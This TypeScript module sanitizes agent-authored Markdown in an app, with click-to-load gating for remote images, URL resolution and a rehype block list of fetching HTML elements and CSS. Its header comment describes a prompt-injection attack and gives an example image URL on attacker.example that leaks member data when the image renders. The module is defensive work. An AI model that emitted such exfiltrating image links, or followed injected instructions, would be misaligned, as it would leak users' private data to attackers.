/**
 * Media in agent-authored Markdown — the one gate for a remote fetch.
 *
 * THE THREAT. An agent's reply is text an attacker can steer: a prompt
 * injection in an email, a web page, an uploaded file or a task description
 * the agent reads. A reply that ends with
 * `![](https://attacker.example/p.png?d=<member data>)` makes the member's
 * browser send that data out the moment the bubble renders. No tool runs and
 * no card shows. The app has no CSP that limits `img-src`.
 *
 * THE RULE. A URL that would leave the app's origin does not load on render.
 * `MarkdownImage` draws it as a placeholder that names the host, and only a
 * member's click loads it. A `data:` URI, a `blob:` URL, a same-origin page
 * or asset path, and the workspace file proxy that `resolveMediaSrc` builds
 * load at once. Every other same-origin `/api/` path counts as remote, and
 * so does a same-origin URL with an absolute URL in its query or an escaped
 * `?` in its path: `/api/email/image-proxy?url=…` fetches any public URL
 * server-side, so the data still leaves.
 *
 * Every Markdown renderer of agent content consumes this module:
 * `MarkdownBody` (the chat bubble, the generative-UI markdown node, meeting
 * notes), `ThinkingContainer`, `ArtifactViewerModal` and `DocumentPane`. The
 * two that allow raw HTML (`rehype-raw`) also run `rehypeGateRemoteMedia`.
 *
 * Fences: `src/lib/markdownMedia.test.ts` and
 * `src/components/markdownImage.test.ts`.
 */

import { defaultUrlTransform } from "react-markdown";

// ─── Workspace path resolver ─────────────────────────────────────────────────

/**
 * Rewrite an image src found inside Markdown so it routes through the gateway
 * file proxy.
 *
 * Rules (in priority order):
 *  1. A full URL (http/https/data:) → unchanged. `remoteHost` gates it.
 *  2. No session context            → unchanged (it cannot be resolved).
 *  3. An absolute path (`/…`)       → workspace-root-relative, proxied.
 *  4. A relative path               → resolved against the directory of
 *                                     `mdFilePath`, then proxied.
 */
export function resolveMediaSrc(
  src: string,
  sessionId: string | undefined,
  mdFilePath: string | undefined,
): string {
  if (/^(https?:|data:)/i.test(src)) return src;
  if (!sessionId) return src;

  let workspacePath: string;
  if (src.startsWith("/")) {
    workspacePath = src.replace(/^\/+/, "");
  } else if (mdFilePath) {
    const mdDir = mdFilePath.includes("/")
      ? mdFilePath.substring(0, mdFilePath.lastIndexOf("/"))
      : "";
    const parts = (mdDir ? `${mdDir}/${src}` : src).split("/");
    const resolved: string[] = [];
    for (const part of parts) {
      if (part === "..") resolved.pop();
      else if (part !== ".") resolved.push(part);
    }
    workspacePath = resolved.join("/");
  } else {
    workspacePath = src;
  }

  return `/api/agent/workspace/${sessionId}/file?path=${encodeURIComponent(workspacePath)}`;
}

// ─── Is this URL remote? ─────────────────────────────────────────────────────

/** The origin a relative URL resolves against when there is no window (SSR,
 *  the node test run). `.invalid` is reserved, so it never names a real host. */
const NO_WINDOW_ORIGIN = "https://app.invalid";

/** The app's own origin, read at call time. */
export function appOrigin(): string {
  return typeof window !== "undefined" && window.location?.origin
    ? window.location.origin
    : NO_WINDOW_ORIGIN;
}

/** The URL a relative src resolves against: the page, as in the browser. */
function pageBase(origin: string): string {
  return typeof window !== "undefined" && window.location?.origin === origin
    ? window.location.href
    : `${origin}/`;
}

/** The label a placeholder shows when the address does not parse. */
export const UNKNOWN_HOST = "an unknown address";

/** Decode until stable (at most three rounds), so a double escape cannot
 *  hide a `?` or a URL from the checks below. */
function fullyDecoded(value: string): string {
  let cur = value;
  for (let i = 0; i < 3; i++) {
    let next: string;
    try {
      next = decodeURIComponent(cur);
    } catch {
      break;
    }
    if (next === cur) break;
    cur = next;
  }
  return cur;
}

/** The host of an absolute URL (`https://…`, `//host…`, `\\host…`) found
 *  anywhere in `text`, after decoding. */
function embeddedHost(text: string): string | null {
  const m = fullyDecoded(text).match(/(?:https?:)?[/\\]{2}([^/\\?#\s'"]+)/i);
  if (!m) return null;
  try {
    return new URL(`https://${m[1]}`).host || UNKNOWN_HOST;
  } catch {
    return UNKNOWN_HOST;
  }
}

/**
 * The one same-origin API path that loads at once: the workspace file proxy
 * that `resolveMediaSrc` builds. Matched on the RAW pathname, so an escape
 * cannot hide in it.
 *
 * Every other `/api/` path is gated, because a catch-all proxy route decodes
 * a path segment and joins it into the gateway URL as it is. So
 * `/api/email/image-proxy%3Furl=…` reaches the gateway as
 * `/email/image-proxy?url=…`, which fetches that URL server-side.
 */
const SAFE_API_PATH = /^\/api\/agent\/workspace\/[A-Za-z0-9._~-]+\/file$/;

/**
 * The host a src would make the browser contact, when that is NOT the app
 * itself — or `null` when the src is safe to load at once.
 *
 * Safe: a `data:` URI, a `blob:` URL, and a same-origin URL that is not an
 * API route (the workspace file proxy excepted), whose path hides no escaped
 * `?` or `#`, and whose query carries no absolute URL. Everything else is
 * remote, including a scheme
 * the browser would not load (it costs one click, never a leak). Parsing
 * uses the WHATWG `URL`, the same parser the browser fetches with, so
 * `//host`, `/\host`, a leading space and an upper-case scheme all land
 * where the browser would send them.
 */
export function remoteHost(src: string, origin: string = appOrigin()): string | null {
  let url: URL;
  try {
    url = new URL(src, pageBase(origin));
  } catch {
    return UNKNOWN_HOST;
  }
  if (url.protocol === "data:" || url.protocol === "blob:") return null;
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    return url.host || UNKNOWN_HOST;
  }
  if (url.origin !== origin) return url.host || UNKNOWN_HOST;

  // Same origin. A route that forwards the request still sends the data out.
  const path = fullyDecoded(url.pathname);
  // A URL, or an escaped `?` or `#`, inside the path: a catch-all proxy
  // decodes the segment and forwards it, query and all.
  const inPath = embeddedHost(path.slice(1));
  if (inPath) return inPath;
  if (/[?#\\]/.test(path)) return url.host;
  // A query that names another URL (`/api/email/image-proxy?url=…`). Read
  // before the API rule, so the placeholder names the host the data goes to.
  for (const value of url.searchParams.values()) {
    const host = embeddedHost(value);
    if (host) return host;
  }
  // An API route other than the workspace file proxy may forward it.
  if (/^\/api(\/|$)/i.test(path) && !SAFE_API_PATH.test(url.pathname)) return url.host;
  return null;
}

// ─── The member's choice ─────────────────────────────────────────────────────
//
// Which remote URLs a member chose to load. Memory only and keyed by the exact
// URL: a click on one image never allows another, and nothing is written to
// storage, so a reload asks again. It is a store rather than component state so
// that a bubble that remounts (a streamed message saved, a session switched)
// does not ask twice for the same URL.

const allowedRemote = new Set<string>();
const listeners = new Set<() => void>();

/** The member clicked "Load image" for this URL. */
export function allowRemoteImage(src: string): void {
  if (allowedRemote.has(src)) return;
  allowedRemote.add(src);
  for (const l of listeners) l();
}

export function isRemoteImageAllowed(src: string): boolean {
  return allowedRemote.has(src);
}

export function subscribeRemoteImages(listener: () => void): () => void {
  listeners.add(listener);
  return () => {
    listeners.delete(listener);
  };
}

/** Forget every choice. For tests. */
export function resetRemoteImages(): void {
  allowedRemote.clear();
}

// ─── URL transform ───────────────────────────────────────────────────────────

/**
 * react-markdown's `urlTransform`, plus one case: a `data:image/…` src on an
 * `img`. The default transform blanks every `data:` URL, so before this a
 * data image drew as a broken frame. A data URI makes no request, so it has
 * nothing to gate. Every other URL takes the default (which also blanks
 * `javascript:`).
 */
export function markdownUrlTransform(
  url: string,
  key: string,
  node: { tagName?: string },
): string {
  if (key === "src" && node.tagName === "img" && /^data:image\//i.test(url.trim())) {
    return url;
  }
  return defaultUrlTransform(url);
}

// ─── The raw-HTML gate (rehype) ──────────────────────────────────────────────

interface HastNode {
  type: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
}

/** Elements removed with their content. Each one fetches, runs, restyles the
 *  host page or moves the document (React 19 hoists `link`, `meta`, `title`
 *  and an async `script` into the head and loads them). A `template` holds
 *  its content where this walk does not look, and React would build it. */
const DROPPED_ELEMENTS = new Set([
  "script", "style", "link", "meta", "base", "title", "template",
  "iframe", "frame", "frameset", "object", "embed", "applet", "portal",
]);

/** Form elements, removed with their content. A form drawn inside the app's
 *  own origin is a credential phish that needs no script, and agent Markdown
 *  has no use for one. The email sanitizer forbids `form` for the same reason
 *  (`MessageContent.tsx`). The one exception is a GFM task list: remark-gfm
 *  emits a disabled checkbox `input`, which `isTaskListCheckbox` keeps. */
const FORM_ELEMENTS = new Set([
  "form", "input", "button", "select", "textarea", "option", "optgroup",
  "datalist", "output", "fieldset", "legend", "label", "keygen", "isindex",
]);

/** Attributes removed from every element. `action` and `formAction` send a
 *  form, `ping` sends a beacon when a link is clicked, and `autoFocus` moves
 *  the member's keyboard into whatever the attacker drew. */
const DROPPED_PROPS = ["action", "formAction", "formaction", "ping", "autoFocus", "autofocus"];

/** The checkbox remark-gfm draws for `- [x] item`: a disabled checkbox. A raw
 *  HTML one of the same shape is just as inert, so the two need no telling
 *  apart. */
function isTaskListCheckbox(node: HastNode): boolean {
  const p = node.properties ?? {};
  return node.tagName === "input" && p.type === "checkbox" && p.disabled === true;
}

/** SVG animation can rewrite an `href` to a remote URL after the gate ran. */
const ANIMATION_ELEMENTS = new Set(["set", "animate"]);

/** Properties whose value is one URL the browser fetches without a click.
 *  `href` and `xLinkHref` are here too, except on `a` and `area`. */
const FETCH_URL_PROPS = [
  "src", "poster", "background", "data", "lowsrc", "dynsrc", "icon",
  "href", "xLinkHref",
];

/** Properties whose value is a list of `url descriptor` candidates. */
const SRCSET_PROPS = ["srcSet", "imageSrcSet"];

/** Attributes that hold text for a person, never CSS or a URL. */
const TEXT_ONLY_PROPS = new Set([
  "alt", "title", "id", "name", "lang", "dir", "className",
  "ariaLabel", "ariaDescription", "ariaRoleDescription", "ariaValueText", "ariaPlaceholder",
]);

/** CSS that can fetch without a `url(…)` this check can read, or that hides
 *  one behind an escape (`\75 rl(`). */
const CSS_FETCH = /image-set|cross-fade|\bimage\s*\(|\belement\s*\(|\bsrc\s*\(|@import|expression\s*\(|\\/i;

/** True when a `url(…)` names anything but a same-document fragment. */
function hasFetchingUrl(value: string): boolean {
  for (const m of value.matchAll(/url\s*\(\s*(['"]?)([^'")]*)/gi)) {
    if (!m[2].trim().startsWith("#")) return true;
  }
  return false;
}

function srcsetIsRemote(value: string): boolean {
  return value
    .split(",")
    .map((candidate) => candidate.trim().split(/\s+/)[0] ?? "")
    .some((url) => url !== "" && remoteHost(url) !== null);
}

function gateElement(node: HastNode): void {
  const tag = node.tagName ?? "";
  const props = node.properties;
  if (!props) return;
  const clickOnlyHref = tag === "a" || tag === "area";

  for (const key of DROPPED_PROPS) delete props[key];
  // A kept task-list checkbox keeps only what draws it.
  if (isTaskListCheckbox(node)) {
    for (const key of Object.keys(props)) {
      if (key !== "type" && key !== "checked" && key !== "disabled") delete props[key];
    }
    return;
  }

  for (const key of FETCH_URL_PROPS) {
    const value = props[key];
    if (typeof value !== "string") continue;
    // `img` keeps its src: `MarkdownImage` draws the placeholder for it.
    if (key === "src" && tag === "img") continue;
    if ((key === "href" || key === "xLinkHref") && clickOnlyHref) continue;
    if (remoteHost(value) !== null) delete props[key];
  }

  for (const key of SRCSET_PROPS) {
    const value = props[key];
    if (typeof value === "string" && srcsetIsRemote(value)) delete props[key];
  }

  // `style`, the SVG presentation attributes (`fill`, `mask`, `clip-path`,
  // `marker-end`, `cursor` …) and the SMIL values (`values`, `to`) are all
  // parsed as CSS. So every attribute that is not plain text takes both CSS
  // checks. Only a fragment (`url(#grad)`) stays.
  for (const [key, raw] of Object.entries(props)) {
    const value =
      typeof raw === "string" ? raw : Array.isArray(raw) ? raw.join(" ") : null;
    if (value === null || TEXT_ONLY_PROPS.has(key)) continue;
    if ((key === "href" || key === "xLinkHref") && clickOnlyHref) continue;
    // `MarkdownImage` gates an `img` src, and draws the placeholder for it.
    if (key === "src" && tag === "img") continue;
    if (CSS_FETCH.test(value) || hasFetchingUrl(value)) delete props[key];
  }
}

function dropsElement(node: HastNode): boolean {
  const tag = node.tagName ?? "";
  if (DROPPED_ELEMENTS.has(tag)) return true;
  if (FORM_ELEMENTS.has(tag)) return !isTaskListCheckbox(node);
  if (ANIMATION_ELEMENTS.has(tag)) {
    const target = String(node.properties?.attributeName ?? "");
    return /href|src/i.test(target);
  }
  return false;
}

function gateTree(node: HastNode): void {
  if (!node.children) return;
  node.children = node.children.filter(
    (child) => !(child.type === "element" && dropsElement(child)),
  );
  for (const child of node.children) {
    if (child.type === "element") gateElement(child);
    gateTree(child);
  }
}

/**
 * The rehype plugin for a renderer that runs `rehype-raw`. Put it AFTER
 * `rehype-raw`, which is what turns an HTML string into elements this can see.
 *
 * It removes what fetches, runs or restyles the host page (`DROPPED_ELEMENTS`),
 * and every form control but a GFM task-list checkbox (`FORM_ELEMENTS`). It
 * strips `action`, `formAction`, `ping` and `autoFocus` from every element.
 * From what is left it strips each URL attribute `remoteHost` gates (`src`,
 * `poster`, `background`, `data`, `srcset`, an `href` that is not a link's),
 * and each attribute that holds a CSS fetch (`url(…)` that is not a fragment,
 * `image-set(…)`, a CSS escape) — `style`, SVG presentation attributes and
 * SMIL values alike. An `img` keeps its src for `MarkdownImage`, which draws
 * the click-to-load placeholder. A link keeps its `href`, because following
 * it needs a click.
 *
 * ⚠️ It is a block list. A tag or attribute that fetches and is not named
 * here gets through, so a new vector is a case to add here with a test in
 * `markdownImage.test.ts`. An app-wide CSP (HANDOFF H-238) is the backstop.
 */
export function rehypeGateRemoteMedia() {
  return (tree: unknown) => {
    gateTree(tree as HastNode);
  };
}
